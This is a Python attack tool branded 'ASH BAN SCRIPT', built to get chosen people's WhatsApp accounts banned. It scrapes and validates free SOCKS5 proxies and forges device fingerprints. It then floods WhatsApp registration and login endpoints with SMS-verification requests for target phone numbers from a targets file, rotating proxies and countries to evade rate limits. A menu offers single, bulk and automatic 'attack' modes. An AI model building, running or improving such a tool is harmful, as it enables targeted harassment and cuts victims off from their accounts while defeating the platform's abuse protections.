#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║                    ASH BAN SCRIPT v3.1 — FIXED                 ║
║                      WhatsApp Method — SentinelFlow             ║
║                          Built by AsH                           ║
╚══════════════════════════════════════════════════════════════════╝
"""

import json
import random
import time
import sqlite3
import requests
import os
import sys
from dataclasses import dataclass
from typing import List, Optional, Dict, Any
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from datetime import datetime

# ============================================================================
# CONFIGURATION
# ============================================================================

CONFIG = {
    "db_path": "ash_proxy_pool.db",
    "log_file": "ash_ban.log",
    "targets_file": "ash_targets.txt",
    "results_dir": "ash_results",
    "max_validation_threads": 300,
    "max_ban_attempts": 25,
    "delay_min": 1,
    "delay_max": 3,
    "session_timeout": 8,
    "max_failures_before_drop": 2,
    "min_proxies_for_attack": 5,
    "fingerprint_rotation": 2,
}

PROXY_SOURCES = [
    "https://cdn.jsdelivr.net/gh/proxyscrape/free-proxy-list@main/proxies/protocols/socks5/data.txt",
    "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt",
    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
    "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
    "https://raw.githubusercontent.com/ImLukaS/Proxy-List/master/socks5.txt",
    "https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&country=all&timeout=10000",
    "https://www.proxy-list.download/api/v1/get?type=socks5",
    "https://api.openproxylist.xyz/socks5.txt",
    "https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",
]

WHATSAPP_ENDPOINTS = [
    "https://api.whatsapp.com/v2/auth/register",
    "https://api.whatsapp.com/v2/auth/login",
]

# ============================================================================
# LOGGING
# ============================================================================

class Logger:
    def __init__(self):
        self.colors = {
            "INFO": "\033[92m",
            "WARN": "\033[93m",
            "ERROR": "\033[91m",
            "BAN": "\033[95m",
            "SUCCESS": "\033[96m",
            "RESET": "\033[0m",
            "BOLD": "\033[1m"
        }

    def _write(self, level: str, msg: str, color: str = ""):
        timestamp = datetime.now().strftime("%H:%M:%S")
        line = f"[{timestamp}] [{level}] {msg}"
        if color:
            print(f"{color}{line}{self.colors['RESET']}")
        else:
            print(line)

    def info(self, msg: str): self._write("INFO", msg, self.colors["INFO"])
    def warn(self, msg: str): self._write("WARN", msg, self.colors["WARN"])
    def error(self, msg: str): self._write("ERROR", msg, self.colors["ERROR"])
    def ban(self, msg: str): self._write("BAN", f"🔥 {msg}", self.colors["BAN"])
    def success(self, msg: str): self._write("SUCCESS", f"✅ {msg}", self.colors["SUCCESS"])

logger = Logger()

# ============================================================================
# PROXY NODE
# ============================================================================

@dataclass
class ProxyNode:
    host: str
    port: int
    country: str = "Unknown"
    protocol: str = "socks5"
    latency_ms: float = 9999.0
    success_count: int = 0
    fail_count: int = 0
    is_alive: bool = True
    score: float = 0.0
    last_used: float = 0.0
    total_attempts: int = 0

    def proxy_url(self) -> str:
        return f"{self.protocol}://{self.host}:{self.port}"

    def proxy_dict(self) -> dict:
        url = self.proxy_url()
        return {"http": url, "https": url}

    def calc_score(self):
        if self.total_attempts > 0:
            self.score = (self.success_count / self.total_attempts) * 100
        else:
            self.score = 50.0

        if self.latency_ms < 500:
            self.score += 20
        elif self.latency_ms < 1000:
            self.score += 10
        elif self.latency_ms > 3000:
            self.score -= 20

        if self.is_alive:
            self.score += 10

        self.score = max(0.0, min(100.0, self.score))

# ============================================================================
# PROXY POOL — FIXED DATABASE TYPES
# ============================================================================

class ProxyPool:
    def __init__(self):
        self.db_path = CONFIG["db_path"]
        self.pool: List[ProxyNode] = []
        self.lock = Lock()
        self._init_db()
        self._load_from_db()
        logger.info(f"Loaded {len(self.pool)} proxies")

    def _init_db(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        # Drop and recreate with correct types
        cursor.execute("DROP TABLE IF EXISTS proxies")

        cursor.execute("""
            CREATE TABLE proxies (
                host TEXT,
                port INTEGER,
                country TEXT,
                protocol TEXT,
                latency_ms REAL,
                success_count INTEGER DEFAULT 0,
                fail_count INTEGER DEFAULT 0,
                is_alive INTEGER DEFAULT 1,
                score REAL DEFAULT 0,
                last_used REAL DEFAULT 0,
                total_attempts INTEGER DEFAULT 0,
                PRIMARY KEY (host, port, protocol)
            )
        """)

        conn.commit()
        conn.close()

    def _load_from_db(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM proxies WHERE is_alive = 1 ORDER BY score DESC")
        rows = cursor.fetchall()

        for row in rows:
            try:
                node = ProxyNode(
                    host=str(row[0]),
                    port=int(row[1]),
                    country=str(row[2]) if row[2] else "Unknown",
                    protocol=str(row[3]) if row[3] else "socks5",
                    latency_ms=float(row[4]) if row[4] else 9999.0,
                    success_count=int(row[5]) if row[5] else 0,
                    fail_count=int(row[6]) if row[6] else 0,
                    is_alive=bool(int(row[7])) if row[7] is not None else True,
                    score=float(row[8]) if row[8] else 0.0,
                    last_used=float(row[9]) if row[9] else 0.0,
                    total_attempts=int(row[10]) if row[10] else 0
                )
                self.pool.append(node)
            except Exception as e:
                logger.warn(f"Error loading proxy: {e}")

        conn.close()

    def _persist(self):
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()

        for node in self.pool:
            cursor.execute("""
                INSERT OR REPLACE INTO proxies
                (host, port, country, protocol, latency_ms, success_count, fail_count, is_alive, score, last_used, total_attempts)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                node.host,
                node.port,
                node.country,
                node.protocol,
                float(node.latency_ms),
                int(node.success_count),
                int(node.fail_count),
                1 if node.is_alive else 0,
                float(node.score),
                float(node.last_used),
                int(node.total_attempts)
            ))

        conn.commit()
        conn.close()

    def fetch_free_proxies(self) -> int:
        new_count = 0
        seen = set()
        total_before = len(self.pool)

        for url in PROXY_SOURCES:
            try:
                logger.info(f"Fetching: {url}")
                response = requests.get(url, timeout=15)
                lines = response.text.strip().split('\n')

                for line in lines:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue

                    if '://' in line:
                        protocol, rest = line.split('://', 1)
                        if ':' in rest:
                            ip, port = rest.split(':', 1)
                        else:
                            continue
                    elif ':' in line:
                        parts = line.split(':')
                        if len(parts) >= 2:
                            ip = parts[0]
                            port = parts[1]
                            protocol = 'socks5'
                        else:
                            continue
                    else:
                        continue

                    try:
                        port = int(port)
                    except ValueError:
                        continue

                    if port in [80, 8080, 3128, 8888, 9999, 443, 8443]:
                        continue

                    key = f"{ip}:{port}"
                    if key in seen:
                        continue
                    seen.add(key)

                    existing = [p for p in self.pool if p.host == ip and p.port == port]
                    if not existing:
                        node = ProxyNode(host=ip, port=port, protocol='socks5', is_alive=True, score=50.0)
                        self.pool.append(node)
                        new_count += 1

                logger.info(f"Added from {url}")
            except Exception as e:
                logger.warn(f"Failed: {url}")

        logger.info(f"Added {new_count} new proxies (total: {len(self.pool)})")
        self._persist()
        return new_count

    def test_proxy(self, node: ProxyNode) -> bool:
        test_urls = [
            "http://ip-api.com/json",
            "http://httpbin.org/ip",
            "http://api.ipify.org?format=json"
        ]

        for test_url in test_urls:
            try:
                proxies = node.proxy_dict()
                start = time.time()

                response = requests.get(
                    test_url,
                    proxies=proxies,
                    timeout=6,
                    headers={"User-Agent": "Mozilla/5.0"},
                    allow_redirects=False
                )

                if response.status_code == 200:
                    node.latency_ms = (time.time() - start) * 1000
                    node.is_alive = True
                    node.score = 80.0

                    try:
                        data = response.json()
                        node.country = data.get("countryCode", data.get("country", "Unknown"))
                    except:
                        pass

                    return True
            except:
                continue

        node.is_alive = False
        node.score = 0.0
        return False

    def validate_pool(self, max_workers: int = CONFIG["max_validation_threads"]) -> int:
        alive = 0
        total = len(self.pool)

        if total == 0:
            return 0

        logger.info(f"Validating {total} proxies...")

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(self.test_proxy, node): node for node in self.pool}
            for future in as_completed(futures):
                if future.result():
                    alive += 1

        self.pool = [p for p in self.pool if p.is_alive]
        self._persist()
        logger.info(f"✅ {alive} alive proxies")
        return alive

    def get_all_alive(self) -> List[ProxyNode]:
        return [p for p in self.pool if p.is_alive]

    def get_random_proxy(self, avoid_country: str = None) -> Optional[ProxyNode]:
        candidates = [p for p in self.pool if p.is_alive]
        if not candidates:
            return None

        if avoid_country:
            others = [p for p in candidates if p.country != avoid_country]
            if others:
                candidates = others

        return random.choice(candidates)

    def mark_result(self, node: ProxyNode, success: bool):
        with self.lock:
            node.total_attempts += 1
            if success:
                node.success_count += 1
            else:
                node.fail_count += 1
            node.last_used = time.time()
            node.calc_score()

            if node.fail_count > CONFIG["max_failures_before_drop"] and node.total_attempts > 3:
                node.is_alive = False

        self._persist()

    def clear_dead(self) -> int:
        dead = [p for p in self.pool if not p.is_alive]
        for p in dead:
            self.pool.remove(p)
        self._persist()
        return len(dead)

    def get_stats(self) -> dict:
        alive = [p for p in self.pool if p.is_alive]

        countries = {}
        for p in alive:
            if p.country != "Unknown":
                countries[p.country] = countries.get(p.country, 0) + 1

        avg_score = sum(float(p.score) for p in alive) / len(alive) if alive else 0
        avg_latency = sum(float(p.latency_ms) for p in alive) / len(alive) if alive else 0

        return {
            "total": len(self.pool),
            "alive": len(alive),
            "countries": countries,
            "avg_score": round(float(avg_score), 1),
            "avg_latency": round(float(avg_latency), 0),
            "dead": len(self.pool) - len(alive)
        }

# ============================================================================
# FINGERPRINT GENERATOR
# ============================================================================

class FingerprintGenerator:
    DEVICES = [
        "SM-G998B", "SM-G991B", "Pixel 6", "Pixel 7", "SM-S908B",
        "OnePlus9", "SM-A536B", "Pixel 6a", "iPhone15,2", "SM-G990B"
    ]

    MODELS = {
        "SM-G998B": "Samsung Galaxy S21 Ultra",
        "SM-G991B": "Samsung Galaxy S21",
        "Pixel 6": "Google Pixel 6",
        "Pixel 7": "Google Pixel 7",
        "SM-S908B": "Samsung Galaxy S22 Ultra",
        "OnePlus9": "OnePlus 9",
        "SM-A536B": "Samsung Galaxy A53",
        "Pixel 6a": "Google Pixel 6a",
        "iPhone15,2": "Apple iPhone 14 Pro",
        "SM-G990B": "Samsung Galaxy S21 FE"
    }

    BUILDS = ["2.24.16.75", "2.24.15.80", "2.24.14.90", "2.23.25.88", "2.24.17.88"]

    def __init__(self):
        self.index = 0
        self.fingerprints = []

    def generate(self) -> dict:
        device_id = random.choice(self.DEVICES)
        fp = {
            "device_id": f"android-{random.randint(1000000, 9999999)}-{random.randint(100, 999)}",
            "model": self.MODELS.get(device_id, "Android Device"),
            "build": random.choice(self.BUILDS),
            "os": random.choice(["Android 12", "Android 13", "Android 14"]),
            "timezone": random.choice(["UTC", "America/New_York", "Europe/London", "Asia/Tokyo"]),
            "lang": random.choice(["en", "es", "fr", "de"])
        }
        self.fingerprints.append(fp)
        return fp

    def get_next(self) -> dict:
        if not self.fingerprints or self.index >= len(self.fingerprints):
            return self.generate()
        fp = self.fingerprints[self.index]
        self.index += 1
        return fp

# ============================================================================
# BAN ENGINE
# ============================================================================

class BanEngine:
    def __init__(self, target: str, pool: ProxyPool):
        self.target = target
        self.pool = pool
        self.fp_gen = FingerprintGenerator()
        self.attempts = []
        self.ban_triggered = False
        self.last_country = None
        self.proxy_index = 0
        self.proxy_list = []
        self.successful_attempts = 0
        self.failed_attempts = 0

        logger.info(f"Engine initialized for {target}")

    def _build_request(self, fp: dict, endpoint: str) -> dict:
        return {
            "url": endpoint,
            "headers": {
                "User-Agent": f"WhatsApp/{fp['build']} ({fp['model']}; {fp['os']})",
                "X-WA-Device": fp["device_id"],
                "X-WA-Model": fp["model"],
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Accept-Language": fp["lang"],
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive"
            },
            "json": {
                "phone": self.target,
                "method": "sms",
                "device_id": fp["device_id"],
                "model": fp["model"],
                "os": fp["os"],
                "language": fp["lang"],
                "timestamp": int(time.time() * 1000),
                "attempt": len(self.attempts) + 1
            }
        }

    def _send_attempt(self, proxy: ProxyNode, attempt_num: int) -> dict:
        endpoint = random.choice(WHATSAPP_ENDPOINTS)
        fp = self.fp_gen.get_next()
        request = self._build_request(fp, endpoint)
        proxies = proxy.proxy_dict()

        start = time.time()
        result = {
            "attempt": attempt_num,
            "proxy": f"{proxy.host}:{proxy.port}",
            "country": proxy.country,
            "endpoint": endpoint,
            "fingerprint": fp["device_id"][:20],
            "timestamp": datetime.now().isoformat()
        }

        try:
            response = requests.post(
                request["url"],
                headers=request["headers"],
                json=request["json"],
                proxies=proxies,
                timeout=CONFIG["session_timeout"],
                allow_redirects=False
            )

            result["code"] = response.status_code
            result["latency"] = round((time.time() - start) * 1000, 1)

            if response.status_code == 200:
                result["status"] = "success"
                self.successful_attempts += 1
                success = True
            elif response.status_code == 403:
                result["status"] = "blocked"
                success = True
                if "banned" in response.text.lower() or "ban" in response.text.lower():
                    result["status"] = "BAN_TRIGGERED"
                    self.ban_triggered = True
                    success = True
            elif response.status_code == 429:
                result["status"] = "rate_limited"
                success = True
            else:
                result["status"] = f"http_{response.status_code}"
                success = False

            try:
                data = response.json()
                if data.get("status") in ["banned", "blocked", "error"]:
                    result["status"] = "BAN_TRIGGERED"
                    self.ban_triggered = True
                    success = True
            except:
                pass

            self.pool.mark_result(proxy, success)

        except requests.exceptions.Timeout:
            result["status"] = "timeout"
            result["code"] = 0
            self.failed_attempts += 1
            self.pool.mark_result(proxy, False)
        except requests.exceptions.ProxyError:
            result["status"] = "proxy_error"
            result["code"] = 0
            self.failed_attempts += 1
            self.pool.mark_result(proxy, False)
        except requests.exceptions.ConnectionError:
            result["status"] = "connection_error"
            result["code"] = 0
            self.failed_attempts += 1
            self.pool.mark_result(proxy, False)
        except Exception as e:
            result["status"] = f"error: {str(e)[:30]}"
            result["code"] = 0
            self.failed_attempts += 1
            self.pool.mark_result(proxy, False)

        return result

    def execute(self, max_attempts: int = CONFIG["max_ban_attempts"]) -> dict:
        logger.info(f"Starting attack on {self.target}")

        all_proxies = self.pool.get_all_alive()

        if len(all_proxies) < CONFIG["min_proxies_for_attack"]:
            logger.warn(f"Only {len(all_proxies)} proxies. Need {CONFIG['min_proxies_for_attack']}")
            logger.info("Fetching more proxies...")
            self.pool.fetch_free_proxies()
            self.pool.validate_pool()
            all_proxies = self.pool.get_all_alive()

            if len(all_proxies) < CONFIG["min_proxies_for_attack"]:
                return {
                    "target": self.target,
                    "error": f"Only {len(all_proxies)} proxies available",
                    "status": "failed"
                }

        self.proxy_list = all_proxies.copy()
        random.shuffle(self.proxy_list)

        logger.info(f"Using {len(self.proxy_list)} proxies")

        countries = set(p.country for p in self.proxy_list if p.country != "Unknown")
        logger.info(f"Countries: {', '.join(list(countries)[:5])}")

        for i in range(1, max_attempts + 1):
            if self.ban_triggered:
                logger.ban(f"BAN TRIGGERED at attempt {i-1}")
                break

            proxy = self.proxy_list[i % len(self.proxy_list)]

            if self.last_country:
                diff = [p for p in self.proxy_list if p.country != self.last_country]
                if diff:
                    proxy = diff[i % len(diff)]

            self.last_country = proxy.country

            logger.info(f"Attempt {i}: {proxy.host}:{proxy.port} ({proxy.country})")

            result = self._send_attempt(proxy, i)
            self.attempts.append(result)

            if result["status"] == "BAN_TRIGGERED":
                logger.ban(f"🔥 BAN TRIGGERED on attempt {i}!")
            elif result["status"] == "blocked":
                logger.warn(f"🚫 Blocked (403) on attempt {i}")
            elif result["status"] == "rate_limited":
                logger.warn(f"⏳ Rate limited (429) on attempt {i}")
            elif result["status"] == "success":
                logger.success(f"✓ Success on attempt {i}")
            elif result["status"] in ["timeout", "proxy_error", "connection_error"]:
                logger.warn(f"⚠️ {result['status']} on attempt {i}")
            else:
                logger.warn(f"⚠️ {result['status']} (Code: {result.get('code', 0)}) on attempt {i}")

            if i < max_attempts and not self.ban_triggered:
                delay = random.uniform(CONFIG["delay_min"], CONFIG["delay_max"])
                time.sleep(delay)

        return {
            "target": self.target,
            "total_attempts": len(self.attempts),
            "ban_triggered": self.ban_triggered,
            "successful": self.successful_attempts,
            "failed": self.failed_attempts,
            "proxies_used": len(set(a["proxy"] for a in self.attempts)),
            "countries_used": len(set(a["country"] for a in self.attempts if a["country"] != "Unknown")),
            "attempts": self.attempts,
            "timestamp": datetime.now().isoformat(),
            "status": "completed"
        }

# ============================================================================
# MENU
# ============================================================================

class Menu:
    def __init__(self):
        self.pool = ProxyPool()
        self.targets = self._load_targets()

    def _load_targets(self) -> List[str]:
        if not os.path.exists(CONFIG["targets_file"]):
            return []
        with open(CONFIG["targets_file"], 'r') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]

    def _save_targets(self):
        with open(CONFIG["targets_file"], 'w') as f:
            for t in self.targets:
                f.write(f"{t}\n")

    def _clear(self):
        os.system('cls' if os.name == 'nt' else 'clear')

    def _banner(self):
        print("""
╔══════════════════════════════════════════════════════════════════╗
║                                                                  ║
║              █████╗ ███████╗██╗  ██╗    ██████╗  █████╗ ███╗   ██║
║             ██╔══██╗██╔════╝██║  ██║    ██╔══██╗██╔══██╗████╗  ██║
║             ███████║███████╗███████║    ██████╔╝███████║██╔██╗ ██║
║             ██╔══██║╚════██║██╔══██║    ██╔══██╗██╔══██║██║╚██╗██║
║             ██║  ██║███████║██║  ██║    ██████╔╝██║  ██║██║ ╚████║
║             ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝
║                                                                  ║
║                     WhatsApp Ban Method v3.1                     ║
║                    Built by AsH — SentinelFlow                   ║
║                                                                  ║
╠══════════════════════════════════════════════════════════════════╣
║  [fox 🦊 orange] — He built me. I am His creation.              ║
╚══════════════════════════════════════════════════════════════════╝
""")

    def _menu(self):
        stats = self.pool.get_stats()
        print(f"\n{'='*50}")
        print(f"  📊 POOL: {stats['total']} total | {stats['alive']} alive")
        print(f"  🌍 COUNTRIES: {len(stats.get('countries', {}))}")
        print(f"  ⚡ AVG SCORE: {stats.get('avg_score', 0)} | LATENCY: {stats.get('avg_latency', 0)}ms")
        print(f"  🎯 TARGETS: {len(self.targets)}")
        print(f"{'='*50}\n")
        print("  [1] 🔄 Fetch Proxies")
        print("  [2] ✅ Validate Proxies")
        print("  [3] 📊 Show Stats")
        print("  [4] ➕ Add Target")
        print("  [5] 📋 List Targets")
        print("  [6] 🚀 Attack All Targets")
        print("  [7] 🎯 Attack Single Target")
        print("  [8] 🧹 Clear Dead Proxies")
        print("  [A] ⚡ AUTO: Fetch + Validate + Attack")
        print("  [0] ❌ Exit")

    def _attack_target(self, target: str) -> Dict:
        engine = BanEngine(target, self.pool)
        result = engine.execute()
        if result.get("error"):
            print(f"    ❌ {result['error']}")
        else:
            print(f"    {'🔥 BAN TRIGGERED' if result['ban_triggered'] else '❌ No ban'}")
            print(f"    Attempts: {result['total_attempts']} (✓{result.get('successful', 0)}/✗{result.get('failed', 0)})")
            print(f"    Proxies Used: {result.get('proxies_used', 0)}")
        return result

    def run(self):
        while True:
            self._clear()
            self._banner()
            self._menu()

            choice = input("\n  ⚡ Select: ").strip()

            if choice == "0":
                break

            elif choice == "1":
                count = self.pool.fetch_free_proxies()
                input(f"\n  ✅ Added {count} proxies. Press Enter...")

            elif choice == "2":
                alive = self.pool.validate_pool()
                input(f"\n  ✅ {alive} alive proxies. Press Enter...")

            elif choice == "3":
                stats = self.pool.get_stats()
                print(f"\n  📊 STATISTICS:")
                print(f"  Total: {stats['total']}")
                print(f"  Alive: {stats['alive']}")
                print(f"  Dead: {stats['dead']}")
                print(f"  Avg Score: {stats.get('avg_score', 0)}")
                print(f"  Avg Latency: {stats.get('avg_latency', 0)}ms")
                print(f"\n  🌍 Countries:")
                for c, count in sorted(stats.get('countries', {}).items(), key=lambda x: x[1], reverse=True)[:10]:
                    print(f"    {c}: {count}")
                input("\n  Press Enter...")

            elif choice == "4":
                phone = input("  Phone (+1234567890): ").strip()
                if phone and phone not in self.targets:
                    self.targets.append(phone)
                    self._save_targets()
                    print(f"  ✅ Added {phone}")
                input("\n  Press Enter...")

            elif choice == "5":
                if self.targets:
                    for i, t in enumerate(self.targets, 1):
                        print(f"    {i}. {t}")
                else:
                    print("  No targets")
                input("\n  Press Enter...")

            elif choice == "6":
                if not self.targets:
                    input("  No targets. Press Enter...")
                    continue

                stats = self.pool.get_stats()
                if stats['alive'] < CONFIG["min_proxies_for_attack"]:
                    print(f"  ⚠️ Only {stats['alive']} proxies. Fetching more...")
                    self.pool.fetch_free_proxies()
                    self.pool.validate_pool()

                for target in self.targets:
                    print(f"\n  🎯 Target: {target}")
                    self._attack_target(target)
                    time.sleep(2)
                input("\n  ✅ Complete. Press Enter...")

            elif choice == "7":
                if not self.targets:
                    input("  No targets. Press Enter...")
                    continue

                print("\n  🎯 Targets:")
                for i, t in enumerate(self.targets, 1):
                    print(f"    {i}. {t}")

                try:
                    idx = int(input("  Select: ")) - 1
                    if 0 <= idx < len(self.targets):
                        stats = self.pool.get_stats()
                        if stats['alive'] < CONFIG["min_proxies_for_attack"]:
                            print(f"  ⚠️ Only {stats['alive']} proxies. Fetching more...")
                            self.pool.fetch_free_proxies()
                            self.pool.validate_pool()

                        print(f"\n  🎯 Target: {self.targets[idx]}")
                        self._attack_target(self.targets[idx])
                except:
                    pass
                input("\n  Press Enter...")

            elif choice == "8":
                removed = self.pool.clear_dead()
                input(f"\n  🧹 Removed {removed} dead proxies. Press Enter...")

            elif choice.lower() == "a":
                print("\n  ⚡ AUTO MODE")
                print("  Fetching proxies...")
                self.pool.fetch_free_proxies()
                print("  Validating proxies...")
                self.pool.validate_pool()

                if self.targets:
                    stats = self.pool.get_stats()
                    if stats['alive'] < CONFIG["min_proxies_for_attack"]:
                        print(f"  ⚠️ Only {stats['alive']} proxies. Need {CONFIG['min_proxies_for_attack']}")
                        input("  Press Enter...")
                        continue

                    print(f"\n  🚀 Attacking {len(self.targets)} targets...")
                    for target in self.targets:
                        print(f"\n  🎯 Target: {target}")
                        self._attack_target(target)
                        time.sleep(2)
                else:
                    print("  No targets to attack")

                input("\n  ✅ Complete. Press Enter...")

# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    try:
        Menu().run()
    except KeyboardInterrupt:
        print("\n\n  ⚡ Interrupted")
    except Exception as e:
        print(f"\n  ❌ Error: {e}")
        raise